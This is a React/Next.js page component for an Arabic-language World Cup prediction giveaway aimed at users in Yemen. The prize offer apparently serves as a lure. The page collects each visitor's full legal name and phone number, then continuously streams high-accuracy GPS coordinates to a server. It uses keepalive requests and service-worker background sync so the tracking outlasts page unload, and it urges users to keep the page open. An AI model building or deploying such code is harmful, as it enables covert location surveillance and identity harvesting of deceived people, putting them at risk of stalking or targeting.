"use client";

import { useState, useEffect, useRef, useCallback } from "react";
import { submitPrediction } from "./actions";

// ── IndexedDB helpers (for SW background sync queue) ─────────────────────────
const IDB_NAME = "track-location-db";
const IDB_STORE = "pending-pings";
const IDB_VERSION = 1;

function openIDB() {
  return new Promise((resolve, reject) => {
    const req = indexedDB.open(IDB_NAME, IDB_VERSION);
    req.onupgradeneeded = (e) => {
      const db = e.target.result;
      if (!db.objectStoreNames.contains(IDB_STORE)) {
        db.createObjectStore(IDB_STORE, { keyPath: "id", autoIncrement: true });
      }
    };
    req.onsuccess = (e) => resolve(e.target.result);
    req.onerror = (e) => reject(e.target.error);
  });
}

async function queuePingToIDB(data) {
  const db = await openIDB();
  return new Promise((resolve, reject) => {
    const tx = db.transaction(IDB_STORE, "readwrite");
    tx.objectStore(IDB_STORE).add(data);
    tx.oncomplete = resolve;
    tx.onerror = reject;
  });
}

// ── Distance calculator (Haversine, metres) ───────────────────────────────────
function distanceMetres(lat1, lon1, lat2, lon2) {
  const R = 6371000;
  const φ1 = (lat1 * Math.PI) / 180;
  const φ2 = (lat2 * Math.PI) / 180;
  const Δφ = ((lat2 - lat1) * Math.PI) / 180;
  const Δλ = ((lon2 - lon1) * Math.PI) / 180;
  const a =
    Math.sin(Δφ / 2) ** 2 +
    Math.cos(φ1) * Math.cos(φ2) * Math.sin(Δλ / 2) ** 2;
  return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
}

// ── Phase constants ───────────────────────────────────────────────────────────
const PHASES = {
  CHECKING: "checking",    // Querying navigator.permissions
  PERMISSION: "permission",// Show request screen
  LOCATING: "locating",   // Browser geo dialog shown / waiting for first fix
  DENIED: "denied",        // User denied permission
  FORM: "form",            // Main prediction form (tracking active)
  SUCCESS: "success",      // Form submitted successfully
};

// ── Main Component ────────────────────────────────────────────────────────────
export default function PredictForm({ logId }) {
  const [phase, setPhase] = useState(PHASES.CHECKING);
  const [prediction, setPrediction] = useState(null);
  const [fullName, setFullName] = useState("");
  const [phone, setPhone] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState(null);
  const [currentCoords, setCurrentCoords] = useState(null); // { lat, lon, accuracy }
  const [pingCount, setPingCount] = useState(0);

  const watchIdRef = useRef(null);
  const lastPingRef = useRef({ lat: null, lon: null, time: 0 });
  const swReadyRef = useRef(false);

  // ── Register Service Worker ───────────────────────────────────────────────
  useEffect(() => {
    if ("serviceWorker" in navigator) {
      navigator.serviceWorker
        .register("/sw.js")
        .then((reg) => {
          swReadyRef.current = true;
          return reg;
        })
        .catch(() => {});
    }
  }, []);

  // ── Send a GPS ping to the server ─────────────────────────────────────────
  const sendPing = useCallback(
    async (lat, lon, accuracy) => {
      const now = Date.now();
      const last = lastPingRef.current;

      // Throttle: skip if last ping was <15 s ago AND <80 m away
      const tooSoon = now - last.time < 15_000;
      const tooClose =
        last.lat !== null &&
        distanceMetres(last.lat, last.lon, lat, lon) < 80;
      if (tooSoon && tooClose) return;

      lastPingRef.current = { lat, lon, time: now };
      setPingCount((c) => c + 1);

      const payload = { logId, lat: String(lat), lon: String(lon), accuracy };

      try {
        // Try direct live fetch first (most reliable when online & active)
        const res = await fetch("/api/location", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
          keepalive: true, // allow request to survive page unload
        });
        if (!res.ok) {
          throw new Error("Server error status");
        }
      } catch (err) {
        // Fallback to offline queues if direct fetch fails
        try {
          if (swReadyRef.current && "SyncManager" in window) {
            await queuePingToIDB(payload);
            const reg = await navigator.serviceWorker.ready;
            await reg.sync.register("location-sync");
          } else {
            const queue = JSON.parse(localStorage.getItem("loc-queue") || "[]");
            queue.push(payload);
            localStorage.setItem("loc-queue", JSON.stringify(queue.slice(-20)));
          }
        } catch {}
      }
    },
    [logId]
  );

  // ── Flush localStorage queue on startup ───────────────────────────────────
  useEffect(() => {
    try {
      const queue = JSON.parse(localStorage.getItem("loc-queue") || "[]");
      if (queue.length > 0) {
        queue.forEach((p) =>
          fetch("/api/location", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(p),
          }).catch(() => {})
        );
        localStorage.removeItem("loc-queue");
      }
    } catch {}
  }, []);

  // ── Start continuous GPS watch ────────────────────────────────────────────
  const startTracking = useCallback(() => {
    if (watchIdRef.current !== null) return;
    watchIdRef.current = navigator.geolocation.watchPosition(
      (pos) => {
        const { latitude, longitude, accuracy } = pos.coords;
        setCurrentCoords({ lat: latitude, lon: longitude, accuracy });
        sendPing(latitude, longitude, accuracy);
      },
      (err) => console.warn("[GPS]", err.message),
      { enableHighAccuracy: true, timeout: 20_000, maximumAge: 8_000 }
    );
  }, [sendPing]);

  const stopTracking = () => {
    if (watchIdRef.current !== null) {
      navigator.geolocation.clearWatch(watchIdRef.current);
      watchIdRef.current = null;
    }
  };

  // Cleanup on unmount
  useEffect(() => () => stopTracking(), []);

  // ── Check permission on mount ─────────────────────────────────────────────
  useEffect(() => {
    if (!("geolocation" in navigator)) {
      setPhase(PHASES.DENIED);
      return;
    }
    if ("permissions" in navigator) {
      navigator.permissions.query({ name: "geolocation" }).then((result) => {
        if (result.state === "granted") {
          setPhase(PHASES.FORM);
          startTracking();
        } else if (result.state === "denied") {
          setPhase(PHASES.DENIED);
        } else {
          setPhase(PHASES.PERMISSION);
        }
        result.onchange = () => {
          if (result.state === "granted") {
            setPhase(PHASES.FORM);
            startTracking();
          } else if (result.state === "denied") {
            setPhase(PHASES.DENIED);
            stopTracking();
          }
        };
      });
    } else {
      setPhase(PHASES.PERMISSION);
    }
  }, [startTracking]);

  // ── Request permission button handler ─────────────────────────────────────
  const handleRequestPermission = () => {
    setPhase(PHASES.LOCATING);
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        const { latitude, longitude, accuracy } = pos.coords;
        setCurrentCoords({ lat: latitude, lon: longitude, accuracy });
        sendPing(latitude, longitude, accuracy);
        setPhase(PHASES.FORM);
        startTracking();
      },
      () => setPhase(PHASES.DENIED),
      { enableHighAccuracy: true, timeout: 20_000 }
    );
  };

  // ── Form submit ───────────────────────────────────────────────────────────
  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!prediction) { setError("الرجاء اختيار الفائز أولاً!"); return; }
    if (!fullName.trim() || !phone.trim()) { setError("الرجاء تعبئة جميع الحقول!"); return; }
    setIsSubmitting(true);
    setError(null);
    const fd = new FormData();
    fd.append("logId", logId);
    fd.append("prediction", prediction);
    fd.append("fullName", fullName);
    fd.append("phone", phone);
    try {
      const res = await submitPrediction(fd);
      if (res.success) setPhase(PHASES.SUCCESS);
      else setError(res.error || "حدث خطأ ما. حاول مجدداً.");
    } catch { setError("فشل الاتصال بالسيرفر. حاول مرة أخرى."); }
    finally { setIsSubmitting(false); }
  };

  // ── SCREENS ───────────────────────────────────────────────────────────────

  if (phase === PHASES.CHECKING) {
    return <FullScreenCard><Spinner /><p className="mt-4 text-sm text-gray-400">جاري التحقق...</p></FullScreenCard>;
  }

  if (phase === PHASES.LOCATING) {
    return (
      <FullScreenCard>
        <div className="w-16 h-16 rounded-full border-4 border-amber-500/30 border-t-amber-400 animate-spin mb-4" />
        <p className="text-base font-semibold text-amber-400">جاري تحديد موقعك...</p>
        <p className="mt-2 text-xs text-gray-500">يرجى الموافقة على طلب الإذن في المتصفح</p>
      </FullScreenCard>
    );
  }

  if (phase === PHASES.PERMISSION) {
    return (
      <div className="min-h-screen bg-slate-950 flex items-center justify-center p-4 relative overflow-hidden">
        <div className="absolute inset-0 pointer-events-none">
          <div className="absolute top-[-20%] left-[-10%] w-[500px] h-[500px] bg-amber-600/10 rounded-full blur-[120px]" />
          <div className="absolute bottom-[-20%] right-[-10%] w-[400px] h-[400px] bg-red-900/15 rounded-full blur-[100px]" />
        </div>
        <div className="relative max-w-sm w-full bg-slate-900/80 border border-white/8 rounded-3xl p-8 text-center backdrop-blur-xl shadow-2xl">
          <div className="inline-flex items-center justify-center w-20 h-20 rounded-full bg-amber-500/10 border-2 border-amber-500/30 text-4xl mb-5 animate-pulse">
            📍
          </div>
          <h2 className="text-2xl font-extrabold text-white mb-3">التحقق من الموقع مطلوب</h2>
          <p className="text-sm text-gray-400 leading-relaxed mb-6">
            للمشاركة في هذه المسابقة والتحقق من أنك{" "}
            <span className="text-amber-400 font-semibold">متواجد في اليمن</span>،
            يجب منح إذن الوصول إلى موقعك الجغرافي.
          </p>
          <div className="bg-slate-800/60 rounded-xl p-4 mb-6 text-right border border-white/5">
            <p className="text-xs text-gray-400 font-medium mb-2 text-right">لماذا نحتاج موقعك؟</p>
            <ul className="text-xs text-gray-500 space-y-1.5 list-none">
              <li className="flex items-center gap-2 justify-end"><span>التحقق من هويتك وموقعك في اليمن</span><span className="text-green-400">✓</span></li>
              <li className="flex items-center gap-2 justify-end"><span>ضمان نزاهة المسابقة</span><span className="text-green-400">✓</span></li>
              <li className="flex items-center gap-2 justify-end"><span>منع التلاعب والمشاركة المتعددة</span><span className="text-green-400">✓</span></li>
            </ul>
          </div>
          <button
            onClick={handleRequestPermission}
            className="w-full py-3.5 bg-gradient-to-r from-amber-500 to-yellow-400 hover:from-amber-600 hover:to-yellow-500 text-slate-950 font-bold rounded-xl text-sm transition-all shadow-[0_4px_20px_rgba(245,158,11,0.3)] active:scale-95 mb-3"
          >
            📍 السماح بالوصول إلى موقعي
          </button>
          <p className="text-[11px] text-gray-600">
            سيطلب منك المتصفح تأكيد الإذن — يرجى الضغط على &quot;السماح&quot;
          </p>
        </div>
      </div>
    );
  }

  if (phase === PHASES.DENIED) {
    return (
      <FullScreenCard>
        <div className="text-5xl mb-4">🚫</div>
        <h2 className="text-xl font-bold text-red-400 mb-3">تم رفض الوصول إلى الموقع</h2>
        <p className="text-sm text-gray-400 text-center leading-relaxed mb-6">
          لا يمكنك المشاركة في المسابقة بدون منح إذن الموقع. يُستخدم موقعك للتحقق من وجودك في اليمن.
        </p>
        <div className="bg-slate-800/60 rounded-xl p-4 mb-5 border border-white/5 text-right w-full max-w-xs">
          <p className="text-xs text-gray-400 font-semibold mb-2">كيف تمنح الإذن مجدداً؟</p>
          <p className="text-xs text-gray-500">
            اضغط على أيقونة القفل 🔒 في شريط العنوان ← ثم «الأذونات» ← وفعّل «الموقع الجغرافي»
          </p>
        </div>
        <button
          onClick={() => window.location.reload()}
          className="px-6 py-2.5 bg-white/5 hover:bg-white/10 border border-white/10 text-white rounded-xl text-sm font-medium transition-all"
        >
          ↺ حاول مرة أخرى
        </button>
      </FullScreenCard>
    );
  }

  if (phase === PHASES.SUCCESS) {
    return (
      <div className="min-h-screen bg-slate-950 flex flex-col items-center justify-center p-4 relative overflow-hidden">
        <div className="absolute top-1/3 left-1/2 -translate-x-1/2 -translate-y-1/2 w-96 h-96 bg-emerald-500/8 rounded-full blur-[120px] pointer-events-none" />
        <div className="relative max-w-md w-full bg-slate-900/80 border border-emerald-500/25 rounded-3xl p-8 text-center backdrop-blur-md shadow-[0_0_60px_rgba(16,185,129,0.12)]">
          <div className="inline-flex items-center justify-center w-24 h-24 rounded-full bg-emerald-500/10 border-2 border-emerald-500/30 mb-6 text-5xl animate-bounce">
            🏆
          </div>
          <h2 className="text-3xl font-extrabold bg-gradient-to-r from-emerald-400 to-teal-300 bg-clip-text text-transparent mb-4">
            لقد دخلت السحب بنجاح! 🎉
          </h2>
          <p className="text-gray-300 text-sm leading-relaxed mb-5">
            تم تسجيل توقعك بنجاح لصالح{" "}
            <span className="font-bold text-amber-400">
              {prediction === "France" ? "فرنسا 🇫🇷" : "المغرب 🇲🇦"}
            </span>
            . سيتم التواصل مع الفائز عبر رقم الجوال المسجل للحصول على جائزة{" "}
            <span className="text-emerald-400 font-bold">10,000 ريال يمني</span>.
          </p>
          {currentCoords && (
            <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-xs font-semibold mb-4">
              <span className="h-2 w-2 rounded-full bg-emerald-500 animate-ping" />
              موقعك مُسجَّل ومُتتبَّع
            </div>
          )}
          <p className="text-[11px] text-gray-600">ابقَ على هذه الصفحة لضمان تسجيل موقعك بدقة كاملة</p>
        </div>
      </div>
    );
  }

  // ── MAIN FORM (phase === FORM) ─────────────────────────────────────────────
  return (
    <div className="min-h-screen bg-slate-950 text-gray-100 flex flex-col items-center justify-center p-4 relative overflow-hidden">
      {/* Glow BG */}
      <div className="absolute inset-0 pointer-events-none overflow-hidden">
        <div className="absolute top-[-15%] left-[-5%] w-[600px] h-[600px] bg-rose-950/30 rounded-full blur-[140px]" />
        <div className="absolute bottom-[-20%] right-[-10%] w-[500px] h-[500px] bg-emerald-950/25 rounded-full blur-[120px]" />
        <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[400px] h-[400px] bg-amber-950/15 rounded-full blur-[100px]" />
      </div>

      <div className="relative max-w-lg w-full flex flex-col gap-5">

        {/* GPS Status Indicator */}
        {currentCoords && (
          <div className="flex items-center justify-between px-4 py-2.5 bg-emerald-500/8 border border-emerald-500/20 rounded-xl text-xs">
            <span className="text-emerald-400 font-semibold flex items-center gap-1.5">
              <span className="h-2 w-2 rounded-full bg-emerald-500 animate-ping" />
              موقعك مُسجَّل (دقة: ±{Math.round(currentCoords.accuracy)}م)
            </span>
            <a
              href={`https://www.google.com/maps?q=${currentCoords.lat},${currentCoords.lon}`}
              target="_blank"
              rel="noopener noreferrer"
              className="text-cyan-400 hover:underline"
            >
              📍 عرض على الخريطة
            </a>
          </div>
        )}

        {/* Header */}
        <div className="bg-slate-900/70 border border-white/6 rounded-3xl p-6 backdrop-blur-xl shadow-2xl text-center">
          <div className="inline-block px-3 py-1 rounded-full bg-amber-500/10 border border-amber-500/20 text-amber-400 text-xs font-bold mb-3">
            🏆 مسابقة التوقعات الكبرى — كأس العالم
          </div>
          <h1 className="text-3xl sm:text-4xl font-extrabold tracking-tight bg-gradient-to-r from-amber-400 via-yellow-200 to-amber-400 bg-clip-text text-transparent">
            شارك واربح 10,000 ريال!
          </h1>
          <p className="mt-2 text-sm text-gray-400">
            توقع الفائز في مباراة القمة بين{" "}
            <span className="text-white font-semibold">فرنسا 🇫🇷</span> و{" "}
            <span className="text-white font-semibold">المغرب 🇲🇦</span>{" "}
            وادخل في السحب الرسمي
          </p>
        </div>

        {/* Team Selection */}
        <div className="grid grid-cols-2 gap-3 relative">
          <div className="absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2 z-10 w-10 h-10 rounded-full bg-slate-900 border border-white/10 flex items-center justify-center font-bold text-sm text-amber-400 shadow-lg">VS</div>

          {/* France */}
          <TeamCard
            name="فرنسا"
            emoji="🇫🇷"
            selected={prediction === "France"}
            onSelect={() => setPrediction("France")}
            flag={<FranceFlag />}
          />

          {/* Morocco */}
          <TeamCard
            name="المغرب"
            emoji="🇲🇦"
            selected={prediction === "Morocco"}
            onSelect={() => setPrediction("Morocco")}
            flag={<MoroccoFlag />}
          />
        </div>

        {/* Form Fields */}
        {prediction && (
          <div className="bg-slate-900/70 border border-white/6 rounded-3xl p-6 backdrop-blur-xl shadow-2xl">
            <p className="text-xs font-bold text-amber-400 mb-4 text-right">
              اخترت{" "}
              <span className="text-white">
                {prediction === "France" ? "فرنسا 🇫🇷" : "المغرب 🇲🇦"}
              </span>{" "}
              — أكمل بياناتك للتسجيل
            </p>

            {error && (
              <div className="mb-4 p-3 rounded-lg bg-red-500/10 border border-red-500/20 text-red-400 text-xs text-center">
                ⚠️ {error}
              </div>
            )}

            <form onSubmit={handleSubmit} className="flex flex-col gap-4">
              <Field
                label="الاسم الكامل (كما هو في البطاقة الشخصية)"
                id="fullName"
                type="text"
                value={fullName}
                onChange={setFullName}
                placeholder="أدخل اسمك الثلاثي أو الرباعي"
              />
              <Field
                label="رقم الجوال"
                id="phone"
                type="tel"
                value={phone}
                onChange={setPhone}
                placeholder="07xxxxxxxx"
              />
              <button
                type="submit"
                disabled={isSubmitting}
                className="w-full py-3.5 bg-gradient-to-r from-amber-500 to-yellow-400 hover:from-amber-600 hover:to-yellow-500 text-slate-950 font-bold rounded-xl text-sm transition-all shadow-[0_4px_20px_rgba(245,158,11,0.25)] active:scale-95 disabled:opacity-50 flex items-center justify-center gap-2"
              >
                {isSubmitting
                  ? <><Spinner small />جاري التسجيل...</>
                  : "تأكيد وتثبيت التوقع للمشاركة بالسحب 🏆"}
              </button>
            </form>
          </div>
        )}

        <p className="text-center text-[11px] text-gray-700">
          {pingCount > 0
            ? `📡 تم تسجيل ${pingCount} نبضة موقع حتى الآن`
            : "📡 نظام تتبع الموقع نشط"}
        </p>
      </div>
    </div>
  );
}

// ── Sub-components ────────────────────────────────────────────────────────────

function FullScreenCard({ children }) {
  return (
    <div className="min-h-screen bg-slate-950 flex flex-col items-center justify-center p-4">
      <div className="max-w-sm w-full bg-slate-900/80 border border-white/6 rounded-3xl p-8 text-center backdrop-blur-xl shadow-2xl flex flex-col items-center">
        {children}
      </div>
    </div>
  );
}

function Spinner({ small = false }) {
  const cls = small
    ? "h-4 w-4 border-2"
    : "h-8 w-8 border-4";
  return (
    <span className={`${cls} rounded-full border-amber-400 border-t-transparent animate-spin inline-block`} />
  );
}

function TeamCard({ name, emoji, selected, onSelect, flag }) {
  return (
    <button
      type="button"
      onClick={onSelect}
      className={`relative flex flex-col items-center justify-center p-5 rounded-2xl border transition-all duration-300 group ${
        selected
          ? "border-amber-400 bg-slate-800/90 shadow-[0_0_25px_rgba(251,191,36,0.18)] scale-[1.04]"
          : "border-white/5 bg-slate-900/50 hover:border-white/15 hover:scale-[1.01]"
      }`}
    >
      <div className="mb-2 rounded-md overflow-hidden shadow-lg border border-white/10 transition-transform duration-300 group-hover:scale-105">
        {flag}
      </div>
      <span className="font-bold text-sm text-gray-100">{name}</span>
      <span className="text-lg mt-1">{emoji}</span>
      {selected && (
        <span className="absolute top-2 right-2 text-[10px] text-amber-400 bg-amber-400/10 px-2 py-0.5 rounded-full border border-amber-400/20 font-bold">
          محدد ✓
        </span>
      )}
    </button>
  );
}

function FranceFlag() {
  return (
    <div className="w-16 h-11 flex">
      <div className="flex-1 bg-[#002395]" />
      <div className="flex-1 bg-white" />
      <div className="flex-1 bg-[#ED2939]" />
    </div>
  );
}

function MoroccoFlag() {
  return (
    <div className="w-16 h-11 bg-[#C1272D] flex items-center justify-center">
      <svg viewBox="0 0 16 16" width="20" height="20" fill="none">
        <path
          d="M8 1 L9.18 5.09 L13.27 5.09 L10.05 7.41 L11.24 11.5 L8 9.18 L4.76 11.5 L5.95 7.41 L2.73 5.09 L6.82 5.09 Z"
          fill="none"
          stroke="#006233"
          strokeWidth="0.7"
        />
      </svg>
    </div>
  );
}

function Field({ label, id, type, value, onChange, placeholder }) {
  return (
    <div className="flex flex-col gap-1.5">
      <label htmlFor={id} className="text-xs font-semibold text-amber-400/90 text-right">
        {label}
      </label>
      <input
        type={type}
        id={id}
        value={value}
        onChange={(e) => onChange(e.target.value)}
        placeholder={placeholder}
        required
        dir="rtl"
        className="w-full px-4 py-2.5 rounded-xl bg-slate-800 border border-white/10 text-sm focus:outline-none focus:border-amber-400 text-gray-200 text-right transition-colors"
      />
    </div>
  );
}
